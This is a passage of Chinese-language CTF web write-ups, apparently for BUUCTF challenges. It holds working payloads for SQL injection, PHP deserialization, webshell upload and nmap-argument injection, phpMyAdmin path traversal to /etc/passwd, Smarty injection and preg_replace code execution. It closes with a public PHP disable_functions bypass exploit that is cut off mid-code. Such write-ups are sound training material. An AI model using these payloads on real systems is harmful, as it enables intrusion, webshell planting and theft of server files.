class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); &#125; &#125; &#125; ?&gt; echo 刚好以字符串形式调用Flag类，所以直接赋值$file=”flag.php”,最后payload如下 1?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:\"Flag\":1:&#123;s:4:\"file\";s:8:\"flag.php\";&#125; [网鼎杯 2018]Fakebook访问robots.txt，发现存在user.php.bak备份user.php.bak 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); &#125;&#125; 随便注册一个用户，view.php?no=1存在注入 1view.php?no=-1/**/union/**/select/**/1,(select/*1*/group_concat(data)/*1*/from/**/users),3,4 可以发现data字段存放的就是序列化字符串，在使用的时候应该就会调用进行data字段进行反序列化操作 而且根据报错这里也知道了绝对路劲是/var/www/html/ 构造反序列化POC 12345678910&lt;?phpclass UserInfo&#123; public $name = \"test\"; public $age = 7; public $blog = \"file:///var/www/html/flag.php\";&#125;$res = new UserInfo();echo serialize($res) 根据之前的注入可知，有回显的是第二位，也就是username字段，data对应应该就是第四个字段为，将反序列化字符串尝试以注入的方式写入 1?no=-1 union/**/select/**/1,2,3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"mochu\";s:3:\"age\";i:7;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;' [极客大挑战 2019]HardSQL用户名输入单引号之后报错，简单测试一下and or这些被过滤掉了使用^异或符号替换and 11%27^extractvalue(1,concat(0x7e,user(),0x7e))^'1 等号也被过滤了，等号可以使用like来代替，空格使用()括号来代替获取表名 11%27^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27),0x7e))^'1 获取数据 11%27^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like%27H4rDsq1%27),0x7e))^' 本来想用mid、substr函数的，但是被过滤了，换right函数输出后面的flag 11%27^extractvalue(1,concat(0x7e,(select(group_concat(right(password,13)))from(H4rDsq1)),0x7e))^'1 [GXYCTF2019]BabySQli 返回包里面有一串加密字符串，使用base32+base64进行解密得到 1select * from user where username = '$name' 题目描述里面将密码进行了md5加密，所以可以猜测后端的代码是： 12345678910&lt;?php if($row['username']==’admin’)&#123; if($row['password']==md5($pass))&#123; echo $flag; &#125;else&#123; echo “wrong pass!”; &#125; &#125; else&#123; echo “wrong user!”;&#125;?&gt; 这里考核的一个知识点是： 当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据。即输入admin，密码设置为123456，将123456MD5加密后放进union select 查询中 也就是当name代入查询查询时，在MySQL里面就会生成用户名为admin，密码为123456 MD5加密后的虚拟的数据，同时我们用123456密码进行登录，就能够绕过限制。 最后的payload为： 12username栏：' union select 1,\"admin\",\"e10adc3949ba59abbe56e057f20f883e\";#password栏：123456 [网鼎杯 2020 青龙组]AreUSerialz题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == \"1\") &#123; $this-&gt;write(); &#125; else if($this-&gt;op == \"2\") &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(\"Bad Hacker!\"); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(\"Too long!\"); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(\"Successful!\"); else $this-&gt;output(\"Failed!\"); &#125; else &#123; $this-&gt;output(\"Failed!\"); &#125; &#125; private function read() &#123; $res = \"\"; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo \"[Result]: &lt;br&gt;\"; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === \"2\") $this-&gt;op = \"1\"; $this-&gt;content = \"\"; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125; if(isset($_GET&#123;'str'&#125;)) &#123; $str = (string)$_GET['str']; if(is_valid($str)) &#123; $obj = unserialize($str); &#125; &#125; 弱类型绕过op，php://filter读取文件，is_valid()两种绕过方式(1). p神在小密圈内曾经发过一个点就是在反序列化时，将s改为S，此时后面的字符串支持16进制表示，因此我们的0x00就可以改写为\\00，因为在is_valid中是将我们序列化后的字符串逐个转为ascii然后进行对比，而因此\\00会被解析为三个字符，且都在允许的范围内，因此可以成功绕过(2). 这道题因为出题人的php版本较高，前面的绕过还可以用php7.2+的黑魔法，public属性直接反序列化就能用了。 1234567891011&lt;?phpclass FileHandler&#123; public $op=2; public $filename=\"php://filter/read=convert.base64-encode/resource=flag.php\"; public $content;&#125;$A=new FileHandler();$B=serialize($A);echo $B;?&gt; [GYCTF2020]Blacklist mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。用法: 123 HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。HANDLER tbl_name CLOSE来关闭打开的句柄。 最后 12341';handler FlagHere open;handler FlagHere read first;handler FlagHere close;# [MRCTF2020]你传你🐎呢文件类型为image/jpeg可以上传.htaccess文件和jpg文件 先上传一下.htaccess文件 1SetHandler application/x-httpd-php 再上传图片马 [RoarCTF 2019]Easy JavaWEB-INF/web.xml泄露 WEB-INF主要包含一下文件或目录: 123456/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 漏洞成因 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！ WEB-INF/web.xml看到 com.Wm.ctf.FlagController关键路径根据前文： 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 我们结合tomcat的项目存放路径经验试试下载FlagController.class试试payload: 1filename=WEB-INF/classes/com/wm/ctf/FlagController.class [BUUCTF 2018]Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;if(!isset($_GET['host'])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);&#125; http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/ 利用escapeshellarg()+escapeshellcmd()的两次转义，导致闭合单引号后即可执行任意参数，然后利用Nmap的-oG参数写入shell 1?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php ' [MRCTF2020]Ez_bypass12?gg[]=1&amp;id[]=2post:passwd=1234567a [GKCTF2020]cve版签到cve-2020-7066get_headers()会截断URL中空字符后的内容 这是在php7.3中发现的 ，但是一直有这个漏洞 测试脚本显示这会让恶意脚本获取意外域名的header 。这些header可能泄露敏感信息或者意外地包含攻击者控制的数据。 测试脚本 12345678910&lt;?php// user input$_GET['url'] = \"http://localhost\\0.example.com\";$host = parse_url($_GET['url'], PHP_URL_HOST);if (substr($host, -12) !== '.example.com') &#123; die();&#125;$headers = get_headers($_GET['url']);var_dump($headers); payload 1?url=http://127.0.0.123%00www.ctfhub.com [GXYCTF2019]禁止套娃.git泄露 123456789101112131415161718192021222324&lt;?phpinclude \"flag.php\";echo \"flag在哪里呢？&lt;br&gt;\";if(isset($_GET['exp']))&#123; if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) &#123; if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) &#123; if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) &#123; // echo $_GET['exp']; @eval($_GET['exp']); &#125; else&#123; die(\"还差一点哦！\"); &#125; &#125; else&#123; die(\"再好好想想！\"); &#125; &#125; else&#123; die(\"还想读flag，臭弟弟！\"); &#125;&#125;// highlight_file(__FILE__);?&gt; 其中 123456789101112131415preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])\\(和\\)表示转义括号(?R)?表示引用当前表达式``` 大致意思就是可以使用函数，但是函数中不能有参数```bashlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。scandir() 列出 images 目录中的文件和目录。readfile() 输出一个文件。current() 返回数组中的当前单元, 默认取第一个值。pos() current() 的别名。next() 函数将内部指针指向数组中的下一个元素，并输出。array_reverse()以相反的元素顺序返回数组。highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。 查看有哪些文件 1?exp=print_r(scandir(current(localeconv()))); 打印flag 1?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); 解释 1234scandir(current(localeconv()))是查看当前目录加上array_reverse()是将数组反转，即Array([0]=&gt;index.php[1]=&gt;flag.php=&gt;[2].git[3]=&gt;..[4]=&gt;.)再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.phphighlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码 [GXYCTF2019]BabyUpload先上传 .htaccess 文件，注意抓包，要修改 TYPE 为 jpeg [BJDCTF 2nd]old-hack12post:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=cat /flag [安洵杯 2019]easy_webindex.php 转化为 16 进制，并 base64 两次 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) &#123; echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixi锝� no flag\");&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; echo \"&lt;br&gt;\";&#125;echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) &#123; echo(\"forbid ~\"); echo \"&lt;br&gt;\";&#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123; echo `$cmd`; &#125; else &#123; echo (\"md5 is funny ~\"); &#125;&#125;?&gt; 限制了类型为string，且比较类型为强类型，需要硬碰撞出两个md5一样的字符串，抄一个现成的 123a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 命令执行绕过Linux下的命令执行有很多绕过方法 在命令中穿插\\，不会影响命令执行，如c\\at /fl\\ag sort命令用于将文本文件内容加以排序。sort可针对文本文件的内容，以行为单位来排序。sort%20/flag [BJDCTF2020]Mark loves catgit 泄露 1234567891011121314151617181920212223&lt;?phpinclude 'flag.php';$yds = \"dog\";$is = \"cat\";$handsome = 'yds';foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET['flag'] === $x &amp;&amp; $x !== 'flag')&#123; exit($handsome); &#125;&#125;if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag']))&#123; exit($yds);&#125;if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag')&#123; exit($is);&#125;echo \"the flag is: \".$flag; 可以看到有三个有输出的exit： 123exit($handsome);exit($yds);exit($is); 找一个最简单的，第二个exit： 123if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag']))&#123; exit($yds);&#125; 只要不给flag传值就会退出，退出的时候会显示$yds的值，而$yds的值在代码最开始的时候初始化过： 1$yds = \"dog\"; 初始化和exit之间有代码： 12345678foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125; foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;我们只要在这段代码中令$yds=$flag，将原来$yds变量的值进行覆盖，同时符合退出条件，就可以输出拿到flag [GWCTF 2019]我有一个数据库版本为4.81，经查询，存在远程文件读取漏洞 直接上payload读取passwd文件 1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd [BJDCTF2020]The mystery of ip存在smarty注入payload。网址：https://www.jianshu.com/p/eb8d0137a7d3 12345&#123;if phpinfo()&#125;&#123;/if&#125;&#123;if system('ls')&#125;&#123;/if&#125;&#123; readfile('/flag') &#125;&#123;if show_source('/flag')&#125;&#123;/if&#125;&#123;if system('cat ../../../flag')&#125;&#123;/if&#125; #本题payload payload如下： 123456789GET /flag.php HTTP/1.1Host: node3.buuoj.cn:29925User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeX-Forwarded-For: &#123;if system('cat ../../../flag')&#125;&#123;/if&#125;Upgrade-Insecure-Requests: 1 [De1CTF 2019]SSRF Me123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox)#_init_初始化 def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()):#第一个if：如果checkSign(self) 返回 True ，则进入下一个if#审计checkSign(self) if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200#如果scan在action里面，则我们可以让param进入scan这个函数，并的目录下创建一个result.txt #然后通过scan()函数把名字为param的网址里的内容写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result#如果read在action里面，则我们可以读取读取result.txt的内容赋值给result def checkSign(self): if (getSign(self.action,self.param) == self.sign): return True else: return False#如果getSign(self.action, self.param)和self.sign相等则返回True ,否则返回False#generate Sign For Action Scan.@app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)#提取get方法传入的，参数名叫param对应得值，并将其url编码后赋值给param#将scan赋值给action#审计 getSign()@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())#以get方法传入param参数值，在cookie里面传递action和sign的值#使param绕过waf，审计waf#用我们传进去的 action 、 param 、sign 、ip 这四个参数构造一个Task类对象，并且执行它的Exec方法#审计Task@app.route('/')def index(): return open(\"code.txt\",\"r\").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()#将secert_key 、param 、 action这三个值连接起来后进行md5加密，并将其作为十六进制数据字符串值返回def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return False#移除param头尾指定的字符(默认为空格或换行符)，并将param中中所有大写字符转化为小写#若param以gopher或file为前缀，返回True,否者返回False#回到challenge()if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0') 审计从路由开始，然后在慢慢延申出去 这里有三个路由： /geneSign/De1ta/从/De1ta开始看起，首先是创建了一个Task的类，action、sign的值是由cookie得到，而param的值就是直接通过GET方法传递param参数的值得到，ip就是你的ip地址，接着param参数会经过waf，如果过了waf，则执行这个类的Exec。顺着这个思路，我们追溯到waf这个方法上,通过审计我们知道要绕过waf，param的值不能以 gopher和file开头 接下去执行Task里的Exec方法，通过审计我们发现如果checkSign(self) 为真 ，则可以传递/De1ta页面的param参数进入到scan方法，并的目录下创建一个result.txt ，然后通过scan()函数把参数param的值写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。 审计checkSign(self) 函数，发现如果getSign(cookie传入的action, get传入的param)和cookie传入的sign相等则返回True ,否则返回False 审计getSign(),我们发现不知道secert_key的值，但是路由/geneSign有一个return getSign(scan, param)，这里我们另/geneSign页面的参数param的值为flag.txtread(这里为什么后面会讲到)，通过getSign得到的sign值即为md5(secert_key + ‘flag.txtread’ + ‘scan’) 回到Task类的Exec方法if “read” in self.action:如果read在action里面，则我们可以读取读取result.txt的内容赋值给result，这里result.txt的值实际上是我们传入的param的值 在这里就可以解释为什么/geneSign页面我们传入的param的值要为flag.txtread了，因为结合Exec方法，我们要实现写入文件和读出的功能，就必须另//De1ta页面的action为readsacn或scanread,此时的getSign(),返回的值就是hashlib.md5(secert_key + flag.txt + readscan).hexdigest(),而此时只有另/geneSign页面的param参数为flag.txtread才能使 getSign(self.action, self.param) == getSign(flag.txt+readscan) , 即md5(secret_key+flag.txtread+scan) == md5(secret_key+flag.txt+readscan) 所以第二步就是在/De1ta页面，get ?param=flag.txt ,cookie action=readscan ,sign=我们在/geneSign页面得到的md5值，这样就可以得到flag了 [BJDCTF2020]ZJCTF，不过如此123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[\"text\"];$file = $_GET[\"file\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\"))&#123; echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; die(\"Not now!\"); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 解答读取 next.php 文件内容 123http://8db9374d-313e-4a56-8c16-b395e7075b1f.node3.buuoj.cn/?text=php://input&amp;file=php://filter/read=base64-convert.encode/resource=next.phppost： I have a dream next.php 1234567891011121314151617181920&lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) &#123; return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). \"\\n\";&#125;function getFlag()&#123; @eval($_GET['cmd']);&#125; 详情可看此文章： https://xz.aliyun.com/t/2557 preg_replace 语句如果直接写在程序里面，当然可以成功执行 phpinfo() ，然而我们的 .*是通过 GET 方式传入，传上去的.*变成了__*，由于在PHP中，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，这就导致正则匹配失效。提供一个 payload ： \\S*=${phpinfo()} 1next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system('cat /flag'); 为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)。如果这个理解了，你就能明白下面这个问题： 12345678var_dump(phpinfo()); // 结果：布尔 truevar_dump(strtolower(phpinfo()));// 结果：字符串 '1'var_dump(preg_replace('/(.*)/ie','1','&#123;$&#123;phpinfo()&#125;&#125;'));// 结果：字符串'11'var_dump(preg_replace('/(.*)/ie','strtolower(\"\\\\1\")','&#123;$&#123;phpinfo()&#125;&#125;'));// 结果：空字符串''var_dump(preg_replace('/(.*)/ie','strtolower(\"&#123;$&#123;phpinfo()&#125;&#125;\")','&#123;$&#123;phpinfo()&#125;&#125;'));// 结果：空字符串''这里的'strtolower(\"&#123;$&#123;phpinfo()&#125;&#125;\")'执行后相当于 strtolower(\"&#123;$&#123;1&#125;&#125;\") 又相当于 strtolower(\"&#123;null&#125;\") 又相当于 '' 空字符串` [网鼎杯 2020 朱雀组]phpweb读取index.php源码 12/index.phppost:func=readfile&amp;p=index.php index.php 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") &#123; return $result; &#125; else &#123;return \"\";&#125; &#125; class Test &#123; var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() &#123; if ($this-&gt;func != \"\") &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(\"Hacker...\"); &#125; &#125; ?&gt; 过了很多，发现有个类，没有被可过滤，可以利用反序列化 123456789&lt;?phpclass Test &#123; var $p = \"find / -name flag*\"; var $func = \"system\"; &#125; $test=new Test(); echo serialize($test);?&gt; 寻找flag文件 12index.php post: func=unserialize&amp;p=O:4:\"Test\":2:&#123;s:1:\"p\";s:16:\"grep -r 'flag' /\";s:4:\"func\";s:6:\"system\";&#125; 得到flag文件 12index.php post: func=unserialize&amp;p=O:4:\"Test\":2:&#123;s:1:\"p\";s:22:\"cat /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";&#125; [GKCTF2020]CheckIN1234567891011121314151617181920&lt;title&gt;Check_In&lt;/title&gt;&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()['Ginkgo']; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); 构造一句话，用蚁剑连接 123&lt;?phpecho base64_encode('eval($_POST[\"ye1s\"]);');?&gt; 猜测需要执行/readflag文件才能得到flag，接下来上传disable functions bypass脚本突破执行命令即可，bypass脚本github有很多，自己找一下即可。如绕过脚本：https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215&lt;?php# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=72530## This exploit should work on all PHP 7.0-7.3 versions## Author: https://github.com/mm0r1#pwn(\"uname -a\");pwn(\"/readflag\");function pwn($cmd) &#123; global $abc, $helper; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = \"\"; for ($i=0; $i &lt; $m; $i++) &#123; $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, 